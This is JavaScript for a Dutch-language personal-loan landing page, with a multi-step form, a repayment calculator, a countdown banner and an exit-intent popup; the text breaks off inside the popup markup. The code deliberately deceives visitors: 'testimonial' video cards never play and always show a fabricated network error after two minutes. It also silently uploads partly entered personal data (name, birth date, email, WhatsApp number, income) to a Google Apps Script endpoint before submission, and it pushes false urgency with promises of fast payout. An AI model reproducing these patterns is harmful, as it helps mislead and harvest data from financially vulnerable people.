<script>
// ===============================
// Google Ads - Conversion helpers
// ===============================

// Snippet officiel adapté : on n'appelle ceci QUE lors du submit validé,
// et on lui passe l'URL "mailto:" pour que la redirection se fasse
// DANS le callback, garantissant que l'event part bien avant le départ.
window.gtag_report_conversion = function(url) {
  try {
    var callback = function () {
      if (typeof url !== 'undefined' && url) {
        window.location = url;
      }
    };
    if (typeof gtag === 'function') {
      gtag('event', 'conversion', {
        'send_to': 'AW-17656608344/0XpKCMLspq4bENjsqeNB',
        'event_callback': callback
      });
    } else {
      // Si gtag n'est pas prêt: on redirige immédiatement pour ne pas bloquer l'utilisateur
      callback();
    }
  } catch (_) {
    // Sécurité: ne jamais bloquer l'envoi de l'email
    if (typeof url !== 'undefined' && url) window.location = url;
  }
  return false;
};

// Utilitaire sûr: envoie un event gtag si disponible (évite erreurs console)
function safeGtagEvent(eventName, params) {
  try {
    if (typeof gtag === 'function') {
      gtag('event', eventName, params || {});
    }
  } catch (_) {}
}
</script>

<script>
(function() {
    'use strict';

    // ========================================
    // 0. APPS SCRIPT CONFIG (ONGEWIJZIGD, ALLEEN VERTAALDE COMMENTAREN)
    // ========================================
    const APP_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyaqL3zEvP_9fu3cOGOcDPa8Wa0le87vVA_iGTNhNPd0Zqg3bXtCo_GCtJUwRCzXGMc/exec';

    // Genereert een NUMERIEK session_id (stabiel in het browserscherm voor de sessie)
    const SESSION = {
        id: String(Date.now()) + String(Math.floor(100 + Math.random() * 899)), // bijv.: 1739561234123xxx
        openedAtISO: new Date().toISOString()
    };

    // Helpers POST → Apps Script (url-encoded, no-cors)
    function encodeFormBody(obj) {
        return Object.keys(obj)
            .map(k => encodeURIComponent(k) + '=' + encodeURIComponent(obj[k] == null ? '' : obj[k]))
            .join('&');
    }
    function postToSheet(payload) {
        try {
            const body = encodeFormBody(payload);
            fetch(APP_SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
                body
            }).catch(() => {});
        } catch (_) {}
    }

    // ========================================
    // 1. GLOBALE CONFIGURATIE
    // ========================================
    const CONFIG = {
        autoplayCarousel: false,
        autoplayDelay: 5000,
        smoothScrollOffset: 80,
        minAge: 18,
        tauxInteret: 3,
        minWordsRaison: 1, // legacy compat, niet gebruikt
        exitIntentDelay: 60000,
        countdownEndDate: '2025-10-30T23:59:59', // einde van de aanbieding (banner)
        videoLoadingTime: 120000, // 2 min vóór het tonen van de videofout
        debugMode: true
    };

    const ICONS = {
        ok: 'https://img.icons8.com/?size=100&id=YZHzhN7pF7Dw&format=png&color=16a34a', // groen
        warning: 'https://img.icons8.com/?size=100&id=undefined&format=png&color=000000' // kan falen -> fallback
    };

    const formState = {
        step1Valid: false,
        step2Valid: false,
        step3Valid: false,
        formStarted: false,
        formCompleted: false,
        exitIntentShown: false,
        validationErrors: {
            step1: [],
            step2: [],
            step3: []
        }
    };

    // Tracking voor exit-intent "1m30 zonder CTA-klik"
    let exitIntentTimer = null;
    let ctaClicked = false;
    const pageStartTime = Date.now();

    // ========================================
    // 2. STRIKTE DATUMVALIDATIE (NL-FORMAAT: DD-MM-JJJJ)
    // ========================================
    function isLeapYear(year) {
        return (year % 4 === 0 && year % 100 !== 0) || (year % 400 === 0);
    }

    function getDaysInMonth(month, year) {
        const daysInMonth = {
            1: 31, 2: isLeapYear(year) ? 29 : 28, 3: 31, 4: 30,
            5: 31, 6: 30, 7: 31, 8: 31, 9: 30, 10: 31, 11: 30, 12: 31
        };
        return daysInMonth[month];
    }

    function validateBirthDate(dateStr) {
        if (!dateStr || dateStr.length !== 10) {
            return { valid: false, age: 0, error: 'Vereist formaat: DD-MM-JJJJ' };
        }

        const parts = dateStr.split('-');
        if (parts.length !== 3) {
            return { valid: false, age: 0, error: 'Ongeldig formaat' };
        }

        const day = parseInt(parts[0], 10);
        const month = parseInt(parts[1], 10);
        const year = parseInt(parts[2], 10);

        if (isNaN(day) || isNaN(month) || isNaN(year)) {
            return { valid: false, age: 0, error: 'Ongeldige datum: niet-numerieke tekens' };
        }

        const currentYear = new Date().getFullYear();
        if (year < 1900 || year > currentYear) {
            return { valid: false, age: 0, error: `Het jaar moet tussen 1900 en ${currentYear} liggen` };
        }

        if (month < 1 || month > 12) {
            return { valid: false, age: 0, error: 'Maand moet tussen 01 en 12 liggen' };
        }

        const maxDays = getDaysInMonth(month, year);
        if (day < 1 || day > maxDays) {
            const monthNames = ['', 'januari', 'februari', 'maart', 'april', 'mei', 'juni',
                'juli', 'augustus', 'september', 'oktober', 'november', 'december'];
            return {
                valid: false,
                age: 0,
                error: `${monthNames[month]} ${year} heeft slechts ${maxDays} dagen (u gaf ${day} op)`
            };
        }

        const birthDate = new Date(year, month - 1, day);
        if (birthDate.getDate() !== day ||
            birthDate.getMonth() !== month - 1 ||
            birthDate.getFullYear() !== year) {
            return { valid: false, age: 0, error: 'Deze datum bestaat niet in de kalender' };
        }

        const today = new Date();
        if (birthDate > today) {
            return { valid: false, age: 0, error: 'De datum kan niet in de toekomst liggen' };
        }

        let age = today.getFullYear() - birthDate.getFullYear();
        const monthDiff = today.getMonth() - birthDate.getMonth();
        const dayDiff = today.getDate() - birthDate.getDate();
        if (monthDiff < 0 || (monthDiff === 0 && dayDiff < 0)) {
            age--;
        }

        if (age < CONFIG.minAge) {
            return { valid: false, age, error: `U moet minimaal ${CONFIG.minAge} jaar oud zijn (u bent ${age} jaar)` };
        }
        if (age > 120) {
            return { valid: false, age, error: 'Onaannemelijke geboortedatum (ouder dan 120 jaar)' };
        }
        return { valid: true, age, error: '' };
    }

    // ========================================
    // 3. VALIDATIE MET UITGEBREIDE DEBUG
    // ========================================
    function isValidEmail(email) {
        const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
        if (!emailRegex.test(email)) return false;
        const suspiciousDomains = ['test.com', 'example.com', 'fake.com', 'temp.com', 'azerty.com'];
        const domain = email.split('@')[1];
        if (!domain) return false;
        const domainParts = domain.split('.');
        if (suspiciousDomains.includes(domain)) return false;
        if (domainParts.length < 2 || domainParts[domainParts.length - 1].length < 2) return false;
        return true;
    }

    function isValidPhone(phone) {
        const cleaned = (phone || '').replace(/\s+/g, '');
        if (!cleaned.startsWith('+')) return false;
        const phoneRegex = /^\+\d{1,4}\d{6,14}$/;
        if (!phoneRegex.test(cleaned)) return false;
        const digits = cleaned.substring(1);
        const allSame = digits.split('').every(d => d === digits[0]);
        if (allSame) return false;
        const suspiciousPatterns = ['1234567890', '0000000000', '9999999999', '1111111111'];
        if (suspiciousPatterns.some(pattern => cleaned.includes(pattern))) return false;
        return true;
    }

    // Reden van het project: min. 3 tekens, letters vereist
    function validateRaison(raison) {
        const trimmed = (raison || '').trim();
        if (trimmed.length < 3) return { valid: false, error: 'Minstens 3 tekens vereist' };
        const hasLetters = /[a-zA-ZÀ-ÿ]/.test(trimmed);
        if (!hasLetters) return { valid: false, error: 'Moet letters bevatten' };
        return { valid: true, error: '' };
    }

    function validateName(name) {
        const trimmed = (name || '').trim();
        if (trimmed.length < 2) return { valid: false, error: 'Minimaal 2 tekens' };
        const nameRegex = /^[a-zA-ZÀ-ÿ\s\-']+$/;
        if (!nameRegex.test(trimmed)) return { valid: false, error: 'Ongeldige tekens gedetecteerd' };
        const hasLetters = /[a-zA-ZÀ-ÿ]/.test(trimmed);
        if (!hasLetters) return { valid: false, error: 'Moet letters bevatten' };
        return { valid: true, error: '' };
    }

    // Stap 1
    function validateStep1() {
        formState.validationErrors.step1 = [];

        const prenom = document.getElementById('prenom')?.value.trim() || '';
        const nom = document.getElementById('nom')?.value.trim() || '';
        const dateNaissance = document.getElementById('date-naissance')?.value.trim() || '';
        const email = document.getElementById('email')?.value.trim() || '';
        const whatsapp = document.getElementById('whatsapp')?.value.trim() || '';
        const pays = document.getElementById('pays')?.value || '';

        const prenomValidation = validateName(prenom);
        if (!prenom) formState.validationErrors.step1.push('Voornaam: leeg veld');
        else if (!prenomValidation.valid) formState.validationErrors.step1.push(`Voornaam: ${prenomValidation.error}`);

        const nomValidation = validateName(nom);
        if (!nom) formState.validationErrors.step1.push('Achternaam: leeg veld');
        else if (!nomValidation.valid) formState.validationErrors.step1.push(`Achternaam: ${nomValidation.error}`);

        const dateValidation = validateBirthDate(dateNaissance);
        if (!dateNaissance) formState.validationErrors.step1.push('Geboortedatum: leeg veld');
        else if (!dateValidation.valid) formState.validationErrors.step1.push(`Geboortedatum: ${dateValidation.error}`);

        if (!email) formState.validationErrors.step1.push('E-mail: leeg veld');
        else if (!isValidEmail(email)) formState.validationErrors.step1.push('E-mail: ongeldig of verdacht adres');

        if (!whatsapp) formState.validationErrors.step1.push('WhatsApp: leeg veld');
        else if (!isValidPhone(whatsapp)) formState.validationErrors.step1.push('WhatsApp: ongeldig nummer (internationaal formaat vereist)');

        if (!pays) formState.validationErrors.step1.push('Land: niet geselecteerd');

        formState.step1Valid = formState.validationErrors.step1.length === 0;

        if (CONFIG.debugMode && !formState.step1Valid) {
            console.log('❌ Stap 1 - Fouten:', formState.validationErrors.step1);
        }

        refreshStepOKBadges();
        updateStepAccess();
        checkFormCompletion();

        // Autosave → Sheet
        autosaveToSheet();

        return formState.step1Valid;
    }

    // Stap 2
    function validateStep2() {
        formState.validationErrors.step2 = [];

        const montant = parseFloat(document.getElementById('montant')?.value);
        const duree = parseInt(document.getElementById('duree')?.value);
        const raison = document.getElementById('raison')?.value.trim() || '';

        if (isNaN(montant) || montant < 2000 || montant > 200000) {
            formState.validationErrors.step2.push(`Bedrag: moet tussen € 2.000 en € 200.000 liggen (huidig: € ${montant})`);
        }

        if (isNaN(duree) || duree < 6 || duree > 120) {
            formState.validationErrors.step2.push(`Looptijd: moet tussen 6 en 120 maanden liggen (huidig: ${duree} maanden)`);
        }

        const raisonValidation = validateRaison(raison);
        if (!raison) formState.validationErrors.step2.push('Reden van het project: leeg veld');
        else if (!raisonValidation.valid) formState.validationErrors.step2.push(`Reden van het project: ${raisonValidation.error}`);

        formState.step2Valid = formState.validationErrors.step2.length === 0;

        if (CONFIG.debugMode && !formState.step2Valid) {
            console.log('❌ Stap 2 - Fouten:', formState.validationErrors.step2);
        }

        refreshStepOKBadges();
        updateStepAccess();
        checkFormCompletion();

        // Autosave → Sheet
        autosaveToSheet();

        return formState.step2Valid;
    }

    // Stap 3
    function validateStep3() {
        formState.validationErrors.step3 = [];

        const statut = document.getElementById('statut')?.value || '';
        const revenus = document.getElementById('revenus')?.value || '';

        if (!statut) formState.validationErrors.step3.push('Professionele status: niet geselecteerd');
        if (!revenus) formState.validationErrors.step3.push('Regelmatig inkomen: niet geselecteerd');

        formState.step3Valid = formState.validationErrors.step3.length === 0;

        if (CONFIG.debugMode && !formState.step3Valid) {
            console.log('❌ Stap 3 - Fouten:', formState.validationErrors.step3);
        }

        refreshStepOKBadges();
        checkFormCompletion();

        // Autosave → Sheet
        autosaveToSheet();

        return formState.step3Valid;
    }

    // ========================================
    // 4. VIDEOSPELER MET ENKELE FOUT (⏱️ 2 minuten)
    // ========================================
    const singleVideoError = {
        title: 'Netwerkprobleem gedetecteerd',
        message: 'Uw verbinding lijkt instabiel. Controleer uw internetverbinding en probeer het later opnieuw.',
        code: 'ERR_NETWORK_UNSTABLE'
    };

    function showVideoPlayer(author, location, duration) {
        const modal = document.createElement('div');
        modal.id = 'video-player-modal';
        modal.style.cssText = `
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.95); z-index: 10000;
            display: flex; align-items: center; justify-content: center;
            padding: 1rem; animation: fadeIn 0.3s ease;`;

        modal.innerHTML = `
            <div style="background:#1a1a1a; max-width:900px; width:100%;
                        border-radius:12px; overflow:hidden; box-shadow:0 20px 60px rgba(0,0,0,0.5);">
                <div style="background:#2a2a2a; padding:1rem 1.5rem; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #3a3a3a;">
                    <div>
                        <div style="color:#fff; font-weight:600; font-size:1rem; margin-bottom:.25rem;">${author}</div>
                        <div style="color:#888; font-size:.85rem;">📍 ${location} • ⏱️ ${duration}</div>
                    </div>
                    <button id="close-video-modal" style="background:transparent; border:none; color:#888; font-size:1.5rem; cursor:pointer; width:40px; height:40px; display:flex; align-items:center; justify-content:center; border-radius:8px; transition:all .2s;" title="Sluiten">✕</button>
                </div>
                <div id="video-player-container" style="aspect-ratio:16/9; background:#000; display:flex; align-items:center; justify-content:center; position:relative;">
                    <div id="video-loader" style="display:flex; flex-direction:column; align-items:center; gap:1.5rem;">
                        <div style="width:60px; height:60px; border:4px solid #333; border-top-color:#fff; border-radius:50%; animation: spin 1s linear infinite;"></div>
                        <div style="color:#fff; font-size:.95rem;">Video wordt geladen...</div>
                    </div>
                    <div id="video-error" style="display:none; flex-direction:column; align-items:center; gap:1rem; padding:2rem; text-align:center; max-width:520px;">
                        <div style="display:flex; align-items:center; justify-content:center;">
                            <img id="video-warning-icon" src="${ICONS.warning}" alt="Waarschuwing" style="width:64px;height:64px;display:block;"/>
                        </div>
                        <div style="color:#fff; font-size:1.3rem; font-weight:600; margin-top:.5rem;">${singleVideoError.title}</div>
                        <div style="color:#aaa; font-size:.95rem; line-height:1.6;">${singleVideoError.message}</div>
                        <div style="margin-top:.75rem; padding:.5rem .75rem; background:#2a2a2a; border-radius:8px; font-family:monospace; font-size:.85rem; color:#dc2626;">Code: ${singleVideoError.code}</div>
                        <button id="retry-video" style="margin-top:.75rem; padding:.75rem 2rem; background:#3b82f6; color:#fff; border:none; border-radius:8px; font-size:.95rem; font-weight:600; cursor:pointer; transition:all .2s;">🔄 Opnieuw proberen</button>
                    </div>
                </div>
            </div>`;

        document.body.appendChild(modal);

        const style = document.createElement('style');
        style.textContent = `
            @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
            @keyframes spin { from { transform:rotate(0deg); } to { transform:rotate(360deg); } }
            #close-video-modal:hover { background:#3a3a3a!important; color:#fff!important; }
            #retry-video:hover { background:#2563eb!important; transform: translateY(-2px); }`;
        document.head.appendChild(style);

        const warnImg = modal.querySelector('#video-warning-icon');
        if (warnImg) {
            warnImg.onerror = () => {
                warnImg.replaceWith(Object.assign(document.createElement('div'), {
                    textContent: '⚠️',
                    style: 'font-size:48px;line-height:1;'
                }));
            };
        }

        setTimeout(() => {
            const loader = document.getElementById('video-loader');
            const error = document.getElementById('video-error');
            if (loader && error) {
                loader.style.display = 'none';
                error.style.display = 'flex';
            }
        }, CONFIG.videoLoadingTime);

        document.getElementById('close-video-modal')?.addEventListener('click', () => modal.remove());
        document.getElementById('retry-video')?.addEventListener('click', () => {
            const loader = document.getElementById('video-loader');
            const error = document.getElementById('video-error');
            if (!loader || !error) return;
            error.style.display = 'none';
            loader.style.display = 'flex';
            setTimeout(() => {
                loader.style.display = 'none';
                error.style.display = 'flex';
            }, CONFIG.videoLoadingTime);
        });
        modal.addEventListener('click', (e) => { if (e.target === modal) modal.remove(); });
        const escapeHandler = (e) => { if (e.key === 'Escape') { modal.remove(); document.removeEventListener('keydown', escapeHandler); } };
        document.addEventListener('keydown', escapeHandler);
    }

    // ========================================
    // 5. VIDEO-BEHEER
    // ========================================
    function setupVideoPlayers() {
        const videoCards = document.querySelectorAll('.video-card');
        videoCards.forEach((card) => {
            card.setAttribute('tabindex', '0');
            card.style.outline = 'none';
            card.addEventListener('click', function(e) {
                e.preventDefault();
                const author = this.querySelector('.video-author')?.textContent || '';
                const location = this.querySelector('.video-location')?.textContent || '';
                const duration = this.querySelector('.video-duration')?.textContent || '';
                showVideoPlayer(author, location, duration);
            });
            card.addEventListener('keypress', function(e) {
                if (e.key === 'Enter' || e.key === ' ') {
                    e.preventDefault();
                    this.click();
                }
            });
        });
    }

    // ========================================
    // 6. AUTOMATISCHE DATUMOPMAAK (DD-MM-JJJJ)
    // ========================================
    function setupDateFormatting() {
        const dateInput = document.getElementById('date-naissance');
        if (!dateInput) return;
        dateInput.type = 'text';
        dateInput.placeholder = 'DD-MM-JJJJ';
        dateInput.maxLength = 10;
        dateInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) value = value.substring(0, 2) + '-' + value.substring(2);
            if (value.length >= 5) value = value.substring(0, 5) + '-' + value.substring(5, 9);
            e.target.value = value;
        });
        dateInput.addEventListener('blur', function() {
            const validation = validateBirthDate(this.value);
            if (this.value && !validation.valid) {
                this.setCustomValidity(validation.error);
                this.style.borderColor = '#dc2626';
            } else {
                this.setCustomValidity('');
                this.style.borderColor = '';
                validateStep1();
            }
        });
    }

    // ========================================
    // 7. PROMO-BANNER (zwart + TIMER)
    // ========================================
    function formatCountdown(msRemaining) {
        if (msRemaining <= 0) return '0d 0u 0min 0s';
        const days = Math.floor(msRemaining / (1000 * 60 * 60 * 24));
        const hours = Math.floor((msRemaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((msRemaining % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((msRemaining % (1000 * 60)) / 1000);
        return `${days}d ${hours}u ${minutes}min ${seconds}s`;
    }

    function setupPromoBannerTimer() {
        const promoBanner = document.querySelector('.promo-banner');
        if (!promoBanner) return;

        promoBanner.style.background = '#000';
        promoBanner.style.color = '#fff';
        promoBanner.style.fontWeight = '600';

        const endTs = new Date(CONFIG.countdownEndDate).getTime();

        function tick() {
            const now = Date.now();
            const diff = endTs - now;
            if (diff <= 0) {
                promoBanner.textContent = '🎉 Speciale aanbieding actief';
                return;
            }
            promoBanner.textContent = `⏰ Aanbieding nog ${formatCountdown(diff)} geldig`;
        }

        tick();
        const timer = setInterval(() => {
            const now = Date.now();
            const diff = endTs - now;
            if (diff <= 0) {
                promoBanner.textContent = '🎉 Speciale aanbieding actief';
                clearInterval(timer);
            } else {
                promoBanner.textContent = `⏰ Aanbieding nog ${formatCountdown(diff)} geldig`;
            }
        }, 1000);
    }

    // ========================================
    // 8. CALCULATOR & SLIDERS
    // ========================================
    function calculerMensualite(montant, dureeEnMois, tauxAnnuel) {
        const tauxMensuel = tauxAnnuel / 100 / 12;
        const mensualite = (montant * tauxMensuel) / (1 - Math.pow(1 + tauxMensuel, -dureeEnMois));
        return mensualite;
    }

    function getDateFin(dureeEnMois) {
        const dateFin = new Date();
        dateFin.setMonth(dateFin.getMonth() + parseInt(dureeEnMois, 10));
        const options = { year: 'numeric', month: 'long' };
        return dateFin.toLocaleDateString('nl-NL', options);
    }

    function formatEuros(montant) {
        const n = montant.toLocaleString('nl-NL', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
        return '€ ' + n;
    }

    function formatMontant(value) {
        const s = value.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ' ');
        return '€ ' + s;
    }

    function updateSliderBackground(slider) {
        const min = parseFloat(slider.min) || 0;
        const max = parseFloat(slider.max) || 100;
        const value = parseFloat(slider.value);
        const percentage = ((value - min) / (max - min)) * 100;
        slider.style.background = `linear-gradient(to right, var(--brand) 0%, var(--brand) ${percentage}%, var(--line) ${percentage}%, var(--line) 100%)`;
    }

    function afficherResumePret() {
        const montant = parseFloat(document.getElementById('montant')?.value);
        const duree = parseInt(document.getElementById('duree')?.value, 10);
        const taux = CONFIG.tauxInteret;

        const mensualite = calculerMensualite(montant, duree, taux);
        const coutTotal = mensualite * duree;
        const coutCredit = coutTotal - montant;
        const dateFin = getDateFin(duree);

        let resumeElement = document.getElementById('resume-pret');
        if (!resumeElement) {
            resumeElement = document.createElement('div');
            resumeElement.id = 'resume-pret';
            resumeElement.style.cssText = `
                margin-top: 1.5rem; padding: 1.25rem;
                background: linear-gradient(135deg, #f7f8fb 0%, #e6e8ef 100%);
                border-left: 4px solid var(--brand); border-radius: 10px;
                font-size: 0.9rem; line-height: 1.8;`;
            const raisonGroup = document.getElementById('raison')?.closest('.form-group');
            if (raisonGroup && raisonGroup.parentNode) {
                raisonGroup.parentNode.insertBefore(resumeElement, raisonGroup.nextSibling);
            }
        }

        resumeElement.innerHTML = `
            <div style="font-weight:600;color:var(--brand);margin-bottom:.75rem;font-size:1rem;">📊 Schatting van uw lening</div>
            <div style="color:var(--text);">
                <strong>U wilt ${formatEuros(montant)}</strong> lenen over <strong>${duree} maanden</strong>.
            </div>
            <div style="margin-top:.5rem;color:var(--muted);font-size:.85rem;">
                Met een indicatieve rente van <strong>${taux}%</strong> per jaar:
            </div>
            <div style="margin-top:.75rem;padding:.75rem;background:#fff;border-radius:8px;">
                <div style="display:flex;justify-content:space-between;margin-bottom:.5rem;">
                    <span style="color:var(--muted);">Maandtermijn:</span>
                    <strong style="color:var(--brand);font-size:1.1rem;">${formatEuros(mensualite)}</strong>
                </div>
                <div style="display:flex;justify-content:space-between;margin-bottom:.5rem;padding-top:.5rem;border-top:1px dashed var(--line);">
                    <span style="color:var(--muted);">Totale kredietkosten:</span>
                    <strong style="color:var(--text);">${formatEuros(coutCredit)}</strong>
                </div>
                <div style="display:flex;justify-content:space-between;padding-top:.5rem;border-top:1px dashed var(--line);">
                    <span style="color:var(--muted);">Totaal terug te betalen:</span>
                    <strong style="color:var(--text);">${formatEuros(coutTotal)}</strong>
                </div>
            </div>
            <div style="margin-top:.75rem;color:var(--muted);font-size:.85rem;">
                Laatste betaling voorzien in <strong>${dateFin}</strong>
            </div>
            <div style="margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--line);color:var(--muted);font-size:.8rem;font-style:italic;">
                ⚠️ Indicatieve schatting op basis van een rente van ${taux}%. De definitieve rente wordt bepaald op basis van uw dossier.
            </div>`;
    }

    const montantSlider = document.getElementById('montant');
    const montantValue = document.getElementById('montant-value');
    const dureeSlider = document.getElementById('duree');
    const dureeValue = document.getElementById('duree-value');

    if (montantSlider && montantValue) {
        montantSlider.addEventListener('input', function() {
            montantValue.textContent = formatMontant(this.value);
            updateSliderBackground(this);
            afficherResumePret();
            validateStep2();
        });
        montantValue.textContent = formatMontant(montantSlider.value);
        updateSliderBackground(montantSlider);
    }

    if (dureeSlider && dureeValue) {
        dureeSlider.addEventListener('input', function() {
            dureeValue.textContent = this.value + ' maanden';
            updateSliderBackground(this);
            afficherResumePret();
            validateStep2();
        });
        dureeValue.textContent = dureeSlider.value + ' maanden';
        updateSliderBackground(dureeSlider);
    }

    // ========================================
    // 9. VOLGENDE-KNOPPEN
    // ========================================
    function createNextButtons() {
        // #PATCH-NEXT-BTN-SCOPED : richt zich ALLEEN op de 3 stappen van het formulier
        const details = document.querySelectorAll('#lead-form .form-steps > details');
        details.forEach((detail, index) => {
            // Geen knop maken voor stap 3 ("Uw profiel")
            if (index === details.length - 1) return;

            const stepContent = detail.querySelector('.step-content');
            if (!stepContent) return;
            const nextButton = document.createElement('button');
            nextButton.type = 'button';
            nextButton.className = 'btn-next-step';
            nextButton.innerHTML = 'Volgende →';
            nextButton.style.cssText = `
                margin-top: 1.5rem; padding: 0.85rem 2rem; background: var(--brand); color: white;
                border: none; border-radius: 12px; font-size: 0.95rem; font-weight: 600; cursor: pointer;
                transition: all 0.2s; width: 100%; max-width: 300px; display: block; margin-left: auto; margin-right: auto;`;
            nextButton.addEventListener('mouseenter', function() {
                this.style.background = '#1557e0';
                this.style.transform = 'translateY(-2px)';
            });
            nextButton.addEventListener('mouseleave', function() {
                this.style.background = 'var(--brand)';
                this.style.transform = 'translateY(0)';
            });
            nextButton.addEventListener('click', function() {
                let isValid = false;
                let errors = [];
                if (index === 0) {
                    isValid = validateStep1();
                    errors = formState.validationErrors.step1;
                } else if (index === 1) {
                    isValid = validateStep2();
                    errors = formState.validationErrors.step2;
                }
                if (!isValid) {
                    showNotification(
                        'Onvolledige of ongeldige informatie',
                        'Corrigeer de volgende fouten:\n\n• ' + errors.join('\n• '),
                        'warning'
                    );
                    return;
                }
                detail.open = false;
                const nextDetail = details[index + 1];
                if (nextDetail) {
                    nextDetail.open = true;
                    setTimeout(() => {
                        nextDetail.scrollIntoView({ behavior: 'smooth', block: 'start' });
                    }, 100);
                }
            });
            stepContent.appendChild(nextButton);
        });

        // #PATCH-NEXT-BTN-DESKTOP-SIZE : kleinere “Volgende”-knop op desktop
        const style = document.createElement('style');
        style.textContent = `
            @media (min-width: 901px) {
              .btn-next-step{ 
                max-width: 220px !important;
                font-size: 0.9rem !important;
                padding: 0.7rem 1rem !important;
              }
            }`;
        document.head.appendChild(style);
    }

    // ========================================
    // 10. TOEGANG TOT STAPPEN + HITBOX + OK-ICOON
    // ========================================
    function injectSummaryHitboxStyles() {
        const style = document.createElement('style');
        style.textContent = `
            details > summary { padding: 1rem .75rem !important; margin: -0.25rem -0.25rem 0 -0.25rem; border-radius: 10px; cursor: pointer; }
            details > summary:hover { background: rgba(30, 102, 255, 0.06); }
            .ok-badge { display:inline-flex; align-items:center; justify-content:center; width:20px; height:20px; margin-left:8px; vertical-align:middle; }
            .ok-badge img { width:20px; height:20px; display:block; }`;
        document.head.appendChild(style);
    }

    function ensureOKBadge(summaryEl) {
        if (!summaryEl) return;
        let badge = summaryEl.querySelector('.ok-badge');
        if (!badge) {
            badge = document.createElement('span');
            badge.className = 'ok-badge';
            const img = document.createElement('img');
            img.src = ICONS.ok;
            img.alt = 'OK';
            badge.appendChild(img);
            summaryEl.appendChild(badge);
        }
        return badge;
    }

    function refreshStepOKBadges() {
        const details = document.querySelectorAll('details');
        if (details.length >= 3) {
            const s1 = details[0].querySelector('summary');
            const s2 = details[1].querySelector('summary');
            const s3 = details[2].querySelector('summary');

            const b1 = ensureOKBadge(s1);
            const b2 = ensureOKBadge(s2);
            const b3 = ensureOKBadge(s3);

            if (b1) b1.style.visibility = formState.step1Valid ? 'visible' : 'hidden';
            if (b2) b2.style.visibility = formState.step2Valid ? 'visible' : 'hidden';
            if (b3) b3.style.visibility = formState.step3Valid ? 'visible' : 'hidden';
        }
    }

    function updateStepAccess() {
        const details = document.querySelectorAll('details');
        if (details.length >= 3) {
            const step2 = details[1];
            const step3 = details[2];
            if (!formState.step1Valid) {
                step2.removeAttribute('open');
                step2.querySelector('summary').style.opacity = '0.5';
                step2.querySelector('summary').style.cursor = 'not-allowed';
            } else {
                step2.querySelector('summary').style.opacity = '1';
                step2.querySelector('summary').style.cursor = 'pointer';
            }
            if (!formState.step1Valid || !formState.step2Valid) {
                step3.removeAttribute('open');
                step3.querySelector('summary').style.opacity = '0.5';
                step3.querySelector('summary').style.cursor = 'not-allowed';
            } else {
                step3.querySelector('summary').style.opacity = '1';
                step3.querySelector('summary').style.cursor = 'pointer';
            }
        }
    }

    function checkFormCompletion() {
        const allValid = formState.step1Valid && formState.step2Valid && formState.step3Valid;
        if (allValid) {
            formState.formCompleted = true;
            if (!exitIntentTimer) startExitIntentTimer();
        }
    }

    function preventStepOpening() {
        const details = document.querySelectorAll('details');
        details.forEach((detail, index) => {
            detail.addEventListener('toggle', function(e) {
                if (this.open) {
                    if (index === 1 && !formState.step1Valid) {
                        e.preventDefault(); this.open = false;
                        showNotification('Vorige stap onvolledig', 'Rond stap 1 af voordat u doorgaat.', 'warning');
                        return false;
                    }
                    if (index === 2 && (!formState.step1Valid || !formState.step2Valid)) {
                        e.preventDefault(); this.open = false;
                        showNotification('Vorige stappen onvolledig', 'Rond stap 1 en 2 af voordat u doorgaat.', 'warning');
                        return false;
                    }
                }
            });
        });
    }

    // ========================================
    // 11. EXIT INTENT (na 90s, als alles geldig is en geen CTA-klik)
    // ========================================
    function startExitIntentTimer() {
        exitIntentTimer = setTimeout(() => {}, CONFIG.exitIntentDelay);
    }

    function showExitIntentPopup() {
        if (formState.exitIntentShown || !formState.formCompleted) return;
        const elapsed = (Date.now() - pageStartTime) / 1000;
        if (elapsed < 90 || ctaClicked) return;

        formState.exitIntentShown = true;

        const montant = formatMontant(document.getElementById('montant')?.value || '0');
        const duree = document.getElementById('duree')?.value || '—';

        // Deadline (J+3) ZONDER tijd
        const deadline = new Date();
        deadline.setHours(deadline.getHours() + 72);
        const deadlineStr = deadline.toLocaleDateString('nl-NL', { day: 'numeric', month: 'long' });

        const popup = document.createElement('div');
        popup.id = 'exit-intent-popup';
        popup.style.cssText = `
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.7); z-index: 10000;
            display: flex; align-items: center; justify-content: center;
            padding: 1rem; animation: fadeIn 0.3s ease;`;

        popup.innerHTML = `
            <div style="background:#fff; max-width:500px; width:100%;
                        border-radius:16px; padding:2.5rem; box-shadow:0 20px 60px rgba(0,0,0,0.3);
                        animation: slideUp .4s ease; text-align:center;">
                <div style="font-size:3rem; margin-bottom:1rem;">🤭</div>
                <h2 style="font-size:1.5rem; font-weight:700; color:var(--text); margin-bottom:1rem;">Oeps! Gaat u al weg?</h2>
                <p style="color:var(--muted); margin-bottom:1.5rem; line-height:1.6;">
                    U bent bijna klaar! Uw aanvraag van <strong style="color: var(--brand);">${montant}</strong>
                    over <strong>${duree} maanden</strong> is gereed.
                </p>
                <p style="color:var(--text); font-weight:600; margin-bottom:2rem; padding:1rem; background:var(--bg-soft); border-radius:10px;">
                    ⏰ Ontvang uw ${montant} vóór<br>
                    <span style="color: var(--brand); font-size: 1.1rem;">${deadlineStr}</span>
                </p>
                <button id="exit-intent-cta" style="width:100%; padding:1rem 2rem; background:var(--accent); color:#fff; border:none; border-radius:12px; font-size:1rem; font-weight:700; cursor:pointer; margin-bottom:1rem; transition:all .2s;">📨 Mijn aanvraag nu afronden</button>
